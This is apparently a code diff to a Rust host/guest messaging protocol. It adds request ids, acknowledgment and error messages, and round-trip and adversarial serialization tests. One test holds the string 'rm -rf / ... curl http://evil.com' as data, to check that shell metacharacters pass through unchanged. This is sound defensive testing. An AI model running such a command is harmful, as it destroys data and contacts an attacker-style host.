@@ -88,6 +88,7 @@ pub enum HostToGuest {
     // -- File operations (reserved) --
     /// Inject file into guest workspace.
     FileWrite {
+        id: u64,
         path: String,
         data: Vec<u8>,
         mode: u32,
@@ -95,7 +96,7 @@ pub enum HostToGuest {
     /// Request file content from guest.
     FileRead { id: u64, path: String },
     /// Delete file in guest workspace.
-    FileDelete { path: String },
+    FileDelete { id: u64, path: String },
     // -- Lifecycle (reserved) --
     /// Graceful shutdown request.
     Shutdown,
@@ -138,6 +139,10 @@ pub enum GuestToHost {
         path: String,
         data: Vec<u8>,
     },
+    /// Acknowledgment of a successful FileWrite or FileDelete.
+    FileOpDone { id: u64 },
+    /// Error encountered during a file operation or exec.
+    Error { id: u64, message: String },
 }
 
 // ---------------------------------------------------------------------------
@@ -368,6 +373,7 @@ mod tests {
     #[test]
     fn roundtrip_file_write() {
         let msg = HostToGuest::FileWrite {
+            id: 1,
             path: "/workspace/test.txt".into(),
             data: b"hello world".to_vec(),
             mode: 0o644,
@@ -375,7 +381,8 @@ mod tests {
         let frame = encode_host_msg(&msg).unwrap();
         let decoded = decode_host_msg(&frame[4..]).unwrap();
         match decoded {
-            HostToGuest::FileWrite { path, data, mode } => {
+            HostToGuest::FileWrite { id, path, data, mode } => {
+                assert_eq!(id, 1);
                 assert_eq!(path, "/workspace/test.txt");
                 assert_eq!(data, b"hello world");
                 assert_eq!(mode, 0o644);
@@ -404,12 +411,16 @@ mod tests {
     #[test]
     fn roundtrip_file_delete() {
         let msg = HostToGuest::FileDelete {
+            id: 2,
             path: "/workspace/tmp".into(),
         };
         let frame = encode_host_msg(&msg).unwrap();
         let decoded = decode_host_msg(&frame[4..]).unwrap();
         match decoded {
-            HostToGuest::FileDelete { path } => assert_eq!(path, "/workspace/tmp"),
+            HostToGuest::FileDelete { id, path } => {
+                assert_eq!(id, 2);
+                assert_eq!(path, "/workspace/tmp");
+            }
             other => panic!("expected FileDelete, got {other:?}"),
         }
     }
@@ -735,6 +746,7 @@ mod tests {
             },
             HostToGuest::Ping,
             HostToGuest::FileWrite {
+                id: u64::MAX,
                 path: "/test".into(),
                 data: vec![0; 10],
                 mode: 0o644,
@@ -744,6 +756,7 @@ mod tests {
                 path: "/test".into(),
             },
             HostToGuest::FileDelete {
+                id: u64::MAX,
                 path: "/test".into(),
             },
             HostToGuest::Shutdown,
@@ -877,6 +890,7 @@ mod tests {
     fn large_file_write_fits_in_frame() {
         // A 200KB file should fit in the 256KB frame.
         let msg = HostToGuest::FileWrite {
+            id: 1,
             path: "/workspace/ca-bundle.crt".into(),
             data: vec![0x41; 200_000],
             mode: 0o644,
@@ -1171,21 +1185,218 @@ mod tests {
     }
 
     #[test]
-    fn cross_decode_host_format() {
-        // Encode with rmp_serde directly (simulating remote), decode with helper.
-        let msg = HostToGuest::Resize {
-            cols: 132,
-            rows: 43,
+    fn roundtrip_file_write_v2() {
+        let msg = HostToGuest::FileWrite {
+            id: 123,
+            path: "/tmp/test".into(),
+            data: b"hello".to_vec(),
+            mode: 0o644,
         };
-        let raw = rmp_serde::to_vec_named(&msg).unwrap();
-        let decoded = decode_host_msg(&raw).unwrap();
+        let frame = encode_host_msg(&msg).unwrap();
+        let decoded = decode_host_msg(&frame[4..]).unwrap();
         match decoded {
-            HostToGuest::Resize { cols, rows } => {
-                assert_eq!(cols, 132);
-                assert_eq!(rows, 43);
+            HostToGuest::FileWrite { id, path, data, mode } => {
+                assert_eq!(id, 123);
+                assert_eq!(path, "/tmp/test");
+                assert_eq!(data, b"hello");
+                assert_eq!(mode, 0o644);
             }
-            other => panic!("expected Resize, got {other:?}"),
+            other => panic!("expected FileWrite, got {other:?}"),
         }
     }
 
+    #[test]
+    fn roundtrip_file_op_done() {
+        let msg = GuestToHost::FileOpDone { id: 456 };
+        let frame = encode_guest_msg(&msg).unwrap();
+        let decoded = decode_guest_msg(&frame[4..]).unwrap();
+        match decoded {
+            GuestToHost::FileOpDone { id } => assert_eq!(id, 456),
+            other => panic!("expected FileOpDone, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn roundtrip_error_msg() {
+        let msg = GuestToHost::Error { id: 789, message: "permission denied".into() };
+        let frame = encode_guest_msg(&msg).unwrap();
+        let decoded = decode_guest_msg(&frame[4..]).unwrap();
+        match decoded {
+            GuestToHost::Error { id, message } => {
+                assert_eq!(id, 789);
+                assert_eq!(message, "permission denied");
+            }
+            other => panic!("expected Error, got {other:?}"),
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // Adversarial: malformed data
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn decode_host_msg_empty_payload() {
+        let result = decode_host_msg(&[]);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn decode_guest_msg_empty_payload() {
+        let result = decode_guest_msg(&[]);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn decode_host_msg_garbage_bytes() {
+        let garbage = vec![0xFF, 0xFE, 0xFD, 0xFC, 0xFB];
+        let result = decode_host_msg(&garbage);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn decode_guest_msg_garbage_bytes() {
+        let garbage = vec![0x00, 0x01, 0x02, 0x03];
+        let result = decode_guest_msg(&garbage);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn decode_host_msg_truncated_msgpack() {
+        // Encode a valid message, then truncate
+        let msg = HostToGuest::Ping;
+        let frame = encode_host_msg(&msg).unwrap();
+        let payload = &frame[4..]; // skip length prefix
+        if payload.len() > 2 {
+            let truncated = &payload[..payload.len() / 2];
+            let result = decode_host_msg(truncated);
+            assert!(result.is_err());
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // Adversarial: boundary values
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn env_key_exactly_max_length() {
+        let key = "A".repeat(MAX_ENV_KEY_LEN);
+        assert!(validate_env_key(&key).is_ok());
+    }
+
+    #[test]
+    fn env_key_one_over_max_length() {
+        let key = "A".repeat(MAX_ENV_KEY_LEN + 1);
+        assert!(validate_env_key(&key).is_err());
+    }
+
+    #[test]
+    fn env_value_exactly_max_length() {
+        let value = "x".repeat(MAX_ENV_VALUE_LEN);
+        assert!(validate_env_value(&value).is_ok());
+    }
+
+    #[test]
+    fn env_value_one_over_max_length() {
+        let value = "x".repeat(MAX_ENV_VALUE_LEN + 1);
+        assert!(validate_env_value(&value).is_err());
+    }
+
+    #[test]
+    fn file_path_with_unicode_emoji() {
+        assert!(validate_file_path("/tmp/\u{1F600}.txt").is_ok());
+    }
+
+    #[test]
+    fn file_path_with_chinese_characters() {
+        assert!(validate_file_path("/tmp/\u{4F60}\u{597D}.txt").is_ok());
+    }
+
+    #[test]
+    fn file_path_very_long() {
+        let long_path = format!("/{}", "a/".repeat(2500));
+        assert!(validate_file_path(&long_path).is_ok());
+    }
+
+    // -----------------------------------------------------------------------
+    // Adversarial: command strings with shell metacharacters
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn exec_command_shell_metacharacters_preserved() {
+        let cmd = "echo $(whoami) && rm -rf / | base64; curl http://evil.com";
+        let msg = HostToGuest::Exec { id: 1, command: cmd.into() };
+        let frame = encode_host_msg(&msg).unwrap();
+        let decoded = decode_host_msg(&frame[4..]).unwrap();
+        match decoded {
+            HostToGuest::Exec { command, .. } => {
+                assert_eq!(command, cmd, "Shell metacharacters must pass through unchanged");
+            }
+            other => panic!("expected Exec, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn exec_command_with_null_bytes() {
+        let cmd = "echo hello\0world";
+        let msg = HostToGuest::Exec { id: 1, command: cmd.into() };
+        let frame = encode_host_msg(&msg).unwrap();
+        let decoded = decode_host_msg(&frame[4..]).unwrap();
+        match decoded {
+            HostToGuest::Exec { command, .. } => assert_eq!(command, cmd),
+            other => panic!("expected Exec, got {other:?}"),
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // Adversarial: max job IDs
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn exec_max_job_id() {
+        let msg = HostToGuest::Exec { id: u64::MAX, command: "echo".into() };
+        let frame = encode_host_msg(&msg).unwrap();
+        let decoded = decode_host_msg(&frame[4..]).unwrap();
+        match decoded {
+            HostToGuest::Exec { id, .. } => assert_eq!(id, u64::MAX),
+            other => panic!("expected Exec, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn exec_done_max_job_id() {
+        let msg = GuestToHost::ExecDone { id: u64::MAX, exit_code: i32::MIN };
+        let frame = encode_guest_msg(&msg).unwrap();
+        let decoded = decode_guest_msg(&frame[4..]).unwrap();
+        match decoded {
+            GuestToHost::ExecDone { id, exit_code } => {
+                assert_eq!(id, u64::MAX);
+                assert_eq!(exit_code, i32::MIN);
+            }
+            other => panic!("expected ExecDone, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn file_content_with_binary_data() {
+        let binary_data: Vec<u8> = (0..=255).collect();
+        let msg = GuestToHost::FileContent { id: 1, data: binary_data.clone(), path: "/f".into() };
+        let frame = encode_guest_msg(&msg).unwrap();
+        let decoded = decode_guest_msg(&frame[4..]).unwrap();
+        match decoded {
+            GuestToHost::FileContent { data, .. } => assert_eq!(data, binary_data),
+            other => panic!("expected FileContent, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn error_msg_very_long_message() {
+        let long_msg = "x".repeat(100_000);
+        let msg = GuestToHost::Error { id: 1, message: long_msg.clone() };
+        let frame = encode_guest_msg(&msg).unwrap();
+        let decoded = decode_guest_msg(&frame[4..]).unwrap();
+        match decoded {
+            GuestToHost::Error { message, .. } => assert_eq!(message, long_msg),
+            other => panic!("expected Error, got {other:?}"),
+        }
+    }
 }
